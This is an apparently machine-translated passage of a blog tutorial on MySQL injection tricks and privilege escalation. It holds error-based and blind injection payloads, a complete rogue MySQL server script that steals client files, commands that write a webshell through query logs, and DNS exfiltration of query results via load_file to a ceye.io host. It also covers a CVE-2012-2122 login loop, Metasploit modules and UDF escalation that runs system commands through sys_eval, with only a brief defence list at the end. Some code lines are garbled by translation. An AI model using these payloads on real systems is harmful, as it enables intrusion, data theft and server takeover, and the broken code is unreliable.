According to the `RFC 3629` specification, some byte values ​​are not allowed to appear in the `UTF-8` encoding. Reference [UTF-8](https://zh.wikipedia.org/wiki/UTF-8#:~:text=%E6%A0%B9%E6%8D%AE%E8%BF%99%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%8F%AF%E4%BB%A5%E5% A4%84%E7%90%86%E6%9B%B4%E5%A4%A7%E6%95%B0%E9%87%8F%E7%9A%84%E5%AD%97%E7%AC%A6%E3%80%82%E5%8E%9F%E6%9D%A5%E7%9A%84%E8%A7%84%E8%8C%83 %E5%85%81%E8%AE%B8%E9%95%BF%E8%BE%BE6%E5%AD%97%E8%8A%82%E7%9A%84%E5%BA%8F%E5%88%97%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%A6%86%E7%9B%96%E5 %88%B031%E4%BD%8D%EF%BC%88%E9%80%9A%E7%94%A8%E5%AD%97%E7%AC%A6%E9%9B%86%E5%8E%9F%E6%9D%A5%E7%9A%84%E6%9E%81%E9%99%90%EF%BC%89%E3%80 %82%E5%B0%BD%E7%AE%A1%E5%A6%82%E6%AD%A4%EF%BC%8C2003%E5%B9%B411%E6%9C%88UTF%2D8%E8%A2%ABRFC%C2%A03629%E9%87%8D%E6%96%B0%E8%A7%84%E 8%8C%83%EF%BC%8C%E5%8F%AA%E8%83%BD%E4%BD%BF%E7%94%A8%E5%8E%9F%E6%9D%A5Unicode%E5%AE%9A%E4%B9%89%E7%9A%84%E5%8C%BA%E5%9F%9F%EF%BC%8C U%2B0000%E5%88%B0U%2B10FFFF%E3%80%82%E6%A0%B9%E6%8D%AE%E8%BF%99%E4%BA%9B%E8%A7%84%E8%8C%83%EF%BC%8C%E4%BB%A5%E4%B8%8B%E5%AD%97%E8% 8A%82%E5%80%BC%E5%B0%86%E6%97%A0%E6%B3%95%E5%87%BA%E7%8E%B0%E5%9C%A8%E5%90%88%E6%B3%95UTF%2D8%E5%BA%8F%E5%88%97%E4%B8%AD%EF%BC%9A). Therefore, the value range of the first byte of `UTF-8` is `00-7F` and `C2-F4`. [All UTF-8 characters](https://utf8-chartable.de/unicode-utf8-table.pl).

<div align=center><img src="./images/3.png"></div>

Using this feature above, `admin%c2` can be bypassed. `%c2` is a character that does not exist in the Latin1 character set. `admin%c2` becomes `admin` in the internal operation character set conversion of the last layer. As can be seen above, `%00-%7F` can directly represent a certain character, while `%C2-%F4` cannot directly represent a certain character. They are just the first bytes of other long byte encoding results.

The UTF-8 encoding used in `Mysql` is castrated and only supports three bytes of encoding. Therefore, its character set only has three bytes of characters with the largest number of characters, and the first byte range is: `00-7F`, `C2-EF`. When character set conversion is performed for incomplete long-byte UTF-8 encoding characters, the processing will be directly ignored. Using this feature, `%2c` in `payload` can be replaced with `%c2-%ef`.

## Error injection supplement
`MySQL` error injection is divided into the following categories:
 - Overflow of data types such as `BigInt`.
 - Function parameter format is wrong.
 - Primary key/field duplication.

### uuid related functions
The version of `Trick` applicable to `MySQL` is `8.0.x`, and the parameter format is incorrect to perform error injection.

````sql
SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));
SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));
```

### Bigint numerical operation
When some boundary values ​​of the `MySQL` database are numerical operations, an error may be reported due to the excessive value. For example, the result of `~0` is `18446744073709551615`, if this number participates in the operation, it is easy to make an error.

`P
ayload`: `select !(select * from(select user())a)-~0;`.

### Virtual table error reporting principle
refer to: [rand()+group()+count()](https://xz.aliyun.com/t/7169#:~:text=%E6%AE%B5%E8%BF%9B%E8%A1%8C%E5%88%86%E7%BB%84%E3%80%82-,%E6%AD%A4%E8%BF%87% E7%A8%8B%E4%BC%9A%E5%85%88%E5%BB%BA%E7%AB%8B%E4%B8%80%E4%B8%AA%E8%99%9A%E6%8B%9F%E8%A1%A8,-%EF%BC%8C%E5%AD%98%E5%9C%A8%E4%B8%A4%E4%B8%AA).

`Payload`: `union select count(*),2,concat(':',(select database()),':',floor(rand()*2)) as a from information_schema.tables group by a`.

### name_const
It can be used to obtain database version information, `Payload`: `select * from(select name_const(version(), 0x1), name_const(version(), 0x1))a`.

<div align=center><img src="./images/4.png"></div>

### join using
The system keyword `join` can establish an internal connection between two tables. By connecting the table that you want to query the column name and its own suggested internal connection will occur due to redundancy (the same column name exists). And the error message will have duplicate column names. You can use the `using` expression to declare the inner join condition to avoid error reports.

````sql
select * from(select * from users a join (select * from users)b)c;
select * from(select * from users a join (select * from users)b using(username))c;
select * from(select * from users a join (select * from users)b using(username,password))c
```

### GTID related functions
The versions of the `Trick` applicable to `MySQL` are `5.6.x`, `5.7.x`, and `8.x`, and the parameter format is incorrect to perform error injection.

````sql
select gtid_subset(user(),1);
select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);
select gtid_subtract((select * from(select user())a),1);
```
## File Reading and Writing
As mentioned above, when explaining the read and write content of the file, `file_priv` is the user's file read and write permissions. If there is no permission, the file read and write operation cannot be performed. `secure-file-priv` is a system variable that restricts the file read/write function, as follows:
 - No content, means no limit.
 - is `NULL`, which means that the file is not read/write.
 - is a directory name, which means that only read/write files in a specific directory are allowed.

The default value of `MySQL 5.5.53` itself and later versions `secure-file-priv` is `NULL`, and the previous version was `contentless. There are three ways to view the current value of `secure-file-priv`:

````sql
select @@secure_file_priv;
select @@global.secure_file_priv;
show variables like "secure_file_priv";
```

There are two ways to modify `secure-file-priv`:
 - Add `secure-file-priv=xxxx` by modifying the `my.ini` file.
 - Add parameter `mysqld.exe --secure-file-priv=xxxx` to start the item.


### Low permissions to read files
In the `MySQL 5.5.53` version, the `secure-file-priv=NULL` read file `Payload` is as follows:

````sql
drop table mysql.m1;
CREATE TABLE mysql.m1 (code TEXT );
LOAD DATA LOCAL INFILE 'D://flag.txt' INTO TABLE mysql.m1 fields terminated by '';
select * from mysql.m1;
```

### MySQL reads files when connecting to a database
This vulnerability exploitation method is based on the `load data local infile` method to read files. Simply put, when the client executes the `load data local` statement, it will first send a request to the `MySQL` server. The server receives the request and returns the file address that needs to be read. The client receives the address and reads it, and then sends the read content to the server. For specific attack process details, please refer to: [CSS-T | Mysql Client arbitrary file reading attack chain expansion] (https://paper.seebug.org/1112/)

Simple malicious server code, excerpted from [Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server). This process requires the client to allow the use of `load data local`, and this information can be found in the data packet that the client tries to connect to the server:

```python
#!/usr/bin/env python
#coding: utf8

import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers

PORT = 3306
log = logging.getLogger(__name__)
log.setLevel(logging.DEBUG)
tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(
    tmp_format
)

filelist = (
# r'c:\boot.ini',
    r'c:\windows\win.ini',
# r'c:\windows\system32\drivers\etc\hosts',
# '/etc/passwd',
# '/etc/shadow',
)

#=================================================================
#=======No need to change after this lines======
#=================================================================

__author__ = 'Gifts'

def daemonize():
    import os, warnings
    if os.name != 'posix':
        warnings.warn('Cant create daemon on non-posix system')
        Return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open('/dev/null', os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)

class LastPacket(Exception):
    pass

class OutOfOrder(Exception):
    pass

class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        el
se:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)

class http_request_handler(async_chat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        self.push(
            mysql_packet(
                0,
                "".join((
                    '\x0a', # Protocol
                    '3.0.0-Evil_Mysql_Server' + '\0', # Version
                    #'5.1.66-0+squeeze1' + '\0',
                    '\x36\x00\x00\x00', # Thread ID
                    'evilsalt' + '\0', # Salt
                    '\xdf\xf7', # Capabilities
                    '\x08', # Collation
                    '\x02\x00', # Server Status
                    '\0' * 13, # Unknown
                    'evil2222' + '\0',
                ))
            )
        )

        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        log.debug('Pushed: %r', data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        log.debug('Data recved: %r', data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == '\x03':
                        log.info('Query')

                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            '\xFB{0}'.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)
                    elif packet.payload[0] == '\x1b':
                        log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            '\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in '\x02':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0\0'
                        ))
                        raise LastPacket()
                    elif packet.payload == '\x00\x01':
                        self.pus
h(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == 'File':
                        log.info('-- result')
                        log.info('Result: %r', data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, '\0\0\0\x02\0\0\0\0')
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0\0'
                        ))
                        raise LastPacket()
                    else:
                        log.info('-- else')
                        raise ValueError('Unknown packet')
            except LastPacket:
                log.info('Last packet')
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning('Out of order')
                self.push(None)
                self.close_when_done()
        else:
            log.error('Unknown state')
            self.push('None')
            self.close_when_done()

class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Conn from: %r', pair[1])
            tmp = http_request_handler(pair)

z = mysql_listener()
daemonize()
asyncore.loop()
```

### Log writing method
Since the value of `secure-file-priv` defaults to `NULL` after the `MySQL 5.5.53` version, this makes it basically unfeasible to read files normally. Here, you can use the method of `MySQL` to generate log files to bypass it.

Some related settings of the `MySQL` log file can be directly carried out through commands, and then the database can execute malicious statements that meet the logging conditions. The usage requirements are:
 - Permissions that can perform log setting operations.
 - Know the absolute path to the target directory.

````sql
Request log:
set global general_log_file = '/var/www/html/shell.php';
set global general_log = on;

Slow query log:
set global slow_query_log_file='/var/www/html/shell.php'
set global slow_query_log = on;
set global log_queries_not_using_indexes = on;
```

## DNSLOG Takeaway Data
Reference: [Dnslog's practical combat in SQL injection] (https://www.anquanke.com/post/id/98096).

Here we recommend `ceye.io`, which integrates the function of `DNSLOG` and does not need to build a `DNS` server by yourself. `Payload`: `load_file(concat('\\\\',(select user()),'.xxxx.ceye.io\xxxx'))`.

`DNSLOG` take-out data application scenario:
 - Three major injections cannot be used.
 - There is file read permission and `secure-file-priv` has no value.
 - Don't know the absolute path to the website/target file/target directory.
 - The target system is `Windows`.

In `Windows`, the path starting with `\\` is defined as the `UNC` path in `Windows`, which is equivalent to the network hard disk. Therefore, if you fill in the domain name, `Windows` will first conduct a `DNS` query. However, there is no such standard for `Linux`, so `DNSLOG` is not applicable in `Linux` environment.

## ORDER BY Comparative Blind
`order by` comparison blind annotation is often used when character interception/comparison restrictions are very strict. For example: `select username,flag,password from users where username='$username;'`.

`Payload`: `select username,flag,password from users where username='admin' union select 1,'a',3 order by 2;`, blind annotation is performed by judging the pre and post order of data returned by the two `select` statements.

## Common functions/symbols
### Comment
 - Single line comments: `#`, `-- x`(x is any character), `;%00`.
 - Multi-line (inline) comments: `/*Arbitrary content*/`.

###Balance conversion

|Function|Description|
|:---:|:---:|
|ORD(str)|Returns the `ASCII` value of the first character of the string.|
|OCT(N) returns the octal number of `N` in the form of a string. `N` is a `BIGINT` value, which has an effect equivalent to `CONV(N,10,8)`.|
|HEX(N_S)|When the parameter is a string, it returns the `16` binary string form of `N_or_S`; when it is a number, it returns its `16` binary form.|
|UNHEX(str)|`HEX(str)` inverse function, converts each pair of `16` digits in the parameter into `10` digits, and then converts them into characters corresponding to the `ASCII` code.|
|BIN(N)|Returns the string representation of the binary value of the decimal value `N`.|
|ASCII(str)|Same as `ORD(string)`.|
|CONV(N,from_base,to_base)|Convert the numerical parameter `N` from the initial binary `from_base` to the target binary `to_base` and return it.|
|CHAR(N,... [USING charset_name])|Explant each parameter `N` as an integer, and returns a string composed of the corresponding characters of these integers in the `ASCII` code.|

### Character interception/split
|Function|Description|
|:---:|:---:|
|SUBSTR(str
,N_start,N_length)|Intercepts the specified string, which is a simple version of `SUBSTRING`.|
|SUBSTRING()|Multiple formats `SUBSTRING(str,pos)`, `SUBSTRING(str FROM pos)`, `SUBSTRING(str,pos,len)`, `SUBSTRING(str FROM pos FOR len)`.|
|RIGHT(str,len)|Seave the specified length from the rightmost point of the specified string.|
|LEFT(str,len)|Seave the specified length from the leftmost point of the specified string.|
|RPAD(str,len,padstr)|Fill the string `padstr` bit of `len` to the right of `str`, and return the new string. If `str` length is greater than `len`, the length of the return value will be reduced to the length specified by `len`.|
|LPAD(str,len,padstr)|Similar to `RPAD`, fill it on the left side of `str`.|
|MID(str,pos,len)|Same as `SUBSTRING(str,pos,len)`.|
|INSERT(str,pos,len,newstr)|In the original string `str`, replace the string with a length of `len` characters starting from the left `pos` bit and a new string `newstr`, and then return the replaced string. `INSERT(str,len,1,0x0)` can be used as an intercept function.|
|CONCAT(str1,str2...)|function is used to merge multiple strings into one string.|
|GROUP_CONCAT(...)|Returns a string result, which is composed of concatenated values ​​in the group.|
|MAKE_SET(bits,str1,str2,...)|Return the input other parameter values ​​according to parameter 1, which can be used as a Boolean blind, for example: `EXP(MAKE_SET((LENGTH(DATABASE())>8)+1,'1','710'))`.|

### Other common functions/statements

|Function/Statement|Description|
|:---:|:---:|
|LENGTH(str)|Returns the length of the string.|
|PI()|Returns the specific value of `π`.|
|REGEXP "statement"|regular matching data, return value is a boolean value.|
|LIKE "statement"|Match data, `%` represents any content, and the return value is a boolean value.|
|RLIKE "statement"|Same as `regexp`.|
|LOCATE(substr,str,[pos])|Returns the location where the substring first appears.|
|POSITION(substr IN str)|equivalent to `LOCATE()`.|
|LOWER(str)|Convert all uppercase letters of a string to lowercase, same as `LCASE(str)`.|
|UPPER(str)|Convert all lowercase letters of the string to uppercase, same as `UCASE(str)`.|
|ELT(N,str1,str2,str3,...)|Similar to `MAKE_SET(bit,str1,str2...)`, returns the parameter value according to `N`.|
|NULLIF(expr1,expr2)|If `expr1` is the same as `expr2`, then return `expr1`, otherwise return `NULL`.|
|CHARSET(str)|Returns the character set used by the string.|
|DECODE(crypt_str,pass_str)|Use `pass_str` as password to decrypt the encryption string `crypt_str`; Encryption function `ENCODE(str,pass_str)`.|

## SELECT Bypass
When the `select` keyword is filtered, the `handler` statement can be used instead of `select` for querying. This is because the `handler` statement can browse data in a table line by line. However, the `handler` statement does not have all the functions of the `select` statement. It is just a statement dedicated to `MySQL` and is not included in the `SQL` standard.

`handler` syntax structure:

````sql
HANDLER tbl_name OPEN [ [AS] alias]

HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]

HANDLER tbl_name CLOSE
```

````sql
handler users open as h3rmesk1t; # Specify the data table to load and rename the return handle
handler h3rmesk1t read first; # Read the first row of data of the specified table/handle
handler h3rmesk1t read next; # Read the next row of data of the specified table/handle
handler h3rmesk1t read next; # Read the next row of data of the specified table/handle
...
handler h3rmesk1t close; # Close the handle
```

## PHP/union.+?select/ig Bypass
In some specific cases, `union` and `select` are prohibited from appearing at the same time, thereby introducing the regular statement `/union.+?select/ig` to determine the input data.

In order to prevent denial of service attacks (reDOS) of regular expressions, `pHP` has set a backtracking limit of `pHP`.backtrack_limit`. If the input data causes `pHP` to backtrack and this number exceeds the specified backtracking limit (default is `1 million," then the regular stops and returns unmatched data. Therefore, you can construct `Payload`: `union/a*100w (acts as garbage data)/select to bypass regular judgment. Reference: [PHP uses PCRE backtracking limits to bypass certain security restrictions] (https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html).

## SYS System Library
````sql
# Query all libraries.
SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;

# Query the table of the specified library (if none, it means that this table has never been accessed).
SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;
SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;

# Statistics the number of tables visited: library name, table name, number of visits.
select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;

# View the details of all connected users: the connected user (connected username, connected ip), the current library, the user status (Sleep is idle), the SQL statement that is being executed, the last executed SQL statement, the time (seconds) of the connection that has been established.
SELECT user,db,command,current_statement,last_statement,time FROM sys.session;

# Check all IPs that have been connected to the database, total number of connections.
SELECT host,total_connections FROM sys.host_summary;
```

|View -> Column Name | Description |
|:---:|:---:|
| host_summary -> host, total_connections | historical connection IP, corresponding IP connection times |
| innodb_buffer_stats_by_schema -> object_schema | Library name |
| innodb_buffer_stats_by_table -> object_schema, object_name | library name, table name (can be specified) |
| io_global_by_file_by_bytes -> file | The path contains the library name |
|
io_global_by_file_by_lateency -> file | The path contains the library name |
| processlist -> current_statement, last_statement | The statement currently executing in the database, the previous statement executed by the handle |
| schema_auto_increment_columns -> table_schema, table_name, column_name | Library name, table name, column name |
| schema_index_statistics -> table_schema, table_name | library name, table name |
| schema_object_overview -> db | Library name |
| schema_table_statistics -> table_schema, table_name | library name, table name |
| schema_table_statistics_with_buffer -> table_schema, table_name | library name, table name |
| schema_tables_with_full_table_scans -> object_schema, object_name | Library name, table name (full scan access) |
| session -> current_statement, last_statement | The statement currently executing in the database, the previous statement executed by the handle |
| statement_analysis -> query, db | The database most recently executed request, the database name for the requested access |
| version -> mysql_version | mysql version information |
| x$innodb_buffer_stats_by_schema | same as innodb_buffer_stats_by_schema |
| x$innodb_buffer_stats_by_table | same as innodb_buffer_stats_by_table |
| x$io_global_by_file_by_bytes | Same as io_global_by_file_by_bytes |
| x$schema_flattened_keys -> table_schema, table_name, index_columns | Library name, table name, primary key name |
| x$ps_schema_table_statistics_io -> table_schema, table_name, count_read | Library name, table name, number of times the table is read |

The `MySQL` database can also query table names and library names:
````sql
select table_name from mysql.innodb_table_stats where database_name=database();
select table_name from mysql.innodb_index_stats where database_name=database();
```

# MySQL Vulnerability Exploitation and Elevation of Rights
The above article roughly summarizes the relevant utilization knowledge of `MySQL` and the corresponding `Trick`. Below we will explain how to increase the authority after obtaining the database permissions.
## Permissions Obtain
### Database operation permissions
Before elevating power, you must first get a high-authorized `MySQL` user. The way to get the username and password of `MySQL` is nothing more than the following methods:
 - `MySQL 3306` port weak password blasting.
 - `--sql-shell` pattern injected by `sqlmap`.
 - Get plaintext password information in the website's database configuration file.
 - `CVE-2012-2122` and other vulnerabilities directly get the `MySQL` permission.

### Webshell Permissions
 - Write `shell` via `into oufile`.
 - Write `shell` through log files.
 - Get and decrypt through the `Hash` value (the `SQL` injected `DBA` permission exists and the target `3306` port can be accessed).

## MySQL Historical Vulnerabilities
### yaSSL buffer overflow
This vulnerability can be directly attacked using the built-in Payload in MSF.

```sh
use exploit/windows/mysql/mysql_yassl_hello
use exploit/linux/mysql/mysql_yassl_hello
```

### CVE-2012-2122
[CVE-2012-2122 Detail](https://nvd.nist.gov/vuln/detail/CVE-2012-2122), you can use `vulhub` to reproduce the vulnerability.

If you don't know the correct password of `MySQL`, run the following command under `bash`, and you can log in successfully after a certain number of attempts:

```bash
for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done
```


This vulnerability can also be directly attacked using the built-in Payload in MSF. After success, it will directly output the `Hash` value of `MySQL`.

```sh
use auxiliary/scanner/mysql/mysql_authbypass_hashdump
set rhosts 127.0.0.1
run
```

## UDF escalation
`UDF`(user defined function), that is, user-defined function. It expands the functions of `MySQL` by adding new functions, just like using local `MySQL` functions such as `user()` or `concat()`.

`UDF` privilege escalation is to use the created custom function `sys_eval` (this custom function can execute any system commands), and the `dll` file needs to be stored in the `lib/plugin` directory of the `MySQL` installation directory (when `MySQL>5.1`, this directory does not exist by default). Call this custom function in `MySQL` to achieve the shell permission of the `system` of the other host, thereby achieving the purpose of escalation of rights.

### Dynamic Link Library
The `UDF.dll` dynamic link library file can be found in the commonly used tools `sqlmap` and `Metasploit`. It should be noted that the dynamic link library built in `sqlmap` has been encoded and cannot be used directly in order to prevent it from being killed by accident. It needs to be used to decode and use it.

```sh
# Decode 32-bit Linux dynamic link library
python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so

# Decode 64-bit Linux dynamic link library
python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so

# Decode 32-bit Windows dynamic link library
python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll

# Decode 64-bit Windows dynamic link library
python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll
```

<div align=center><img src="./images/17.png"></div>

<div align=center><img src="./images/18.png"></div>

### Find plugin directory
After creating the dynamic link library file of `UDF`, you need to place it in the plug-in directory of `MySQL` and query it
The statements are as follows:

````sql
show variables like '%compile%'; # View host version and architecture
show variables like 'plugin%'; # View plugin directory
```

When the `plugin` directory does not exist, you can use the following command to create the `\lib\plugin` folder (depending on the operating system):

````sql
select "h3rmesk1t" into dumpfile 'C:\\Tools\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin::$index_allocation';
```

### Write to dynamic link library
[Related tool address](https://github.com/H3rmesk1t/MySQL-UDF/tree/main).

 - `SQL` injection and has high permissions. The `plugin` directory is writable and `secure_file_priv` is unlimited. The `MySQL` plug-in directory can be written by `MySQL` users. At this time, you can directly use `sqlmap` to upload the dynamic link library. However, `GET` has a byte length limit, so `POST` injection often allows this kind of attack to be performed.

```sh
sqlmap -u "http://localhost:9999/" --data="id=1" --file-write="/Users/h3rmesk1t/Desktop/lib_mysqludf_sys_64.so" --file-dest="/usr/lib/mysql/plugin/udf.so"
```

 - If there is no injection, you can operate native `SQL` statements. In this case, when `secure_file_priv` is unlimited, you can also manually write files to the `plugin` directory.

````sql
# Direct SELECT query hexadecimal write
SELECT 0x7f454c4602... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
```

### Create custom functions and call commands
 - Create function sys_eval.

````sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
```

 - After the import is successful, check whether sys_eval has been added to the MySQL function.

```
SELECT * FROM mysql.func;
```

<div align=center><img src="./images/19.png"></div>

 - Then execute system commands through the created function.

````sql
select sys_eval('whoami');
```

<div align=center><img src="./images/20.png"></div>

### Delete custom functions

````sql
drop function sys_eval;
```

<div align=center><img src="./images/21.png"></div>

# Mysql Injection Defense
 - Single quotes close controllable variables and perform corresponding escape processing.
 - Try to use precompilation to execute `SQL` statements.
 - Adopt the whitelist mechanism/perfect the blacklist.
 - Install `WAF` protection software.
 - Reject unsafe encoding conversions and try to unify encoding.
 - Close the error message.
 - Turn on the magic mode of `php` `magic_quotes_gpc = on`. When some special characters appear on the front end of the website, they will automatically be converted into some other symbols, resulting in the `sql` statement being unable to execute.
 - Open the website firewall, `IIS` firewall, `apache` firewall, `nginx` firewall, etc. They all have built-in filtering parameters injected by `sql`. When the user enters the parameters `get`, `post`, and `cookies`, they will be detected and intercepted in advance.
 - ......

<div align=center><img src="./images/22.png"></div>

# refer to
 - [MySQL Vulnerability Exploitation and Elevation of Rights](https://www.sqlsec.com/2020/11/mysql.html#toc-heading-1)
 - [Summary of classification of MYSQL injection related content and some Tricks](https://xz.aliyun.com/t/7169#toc-35)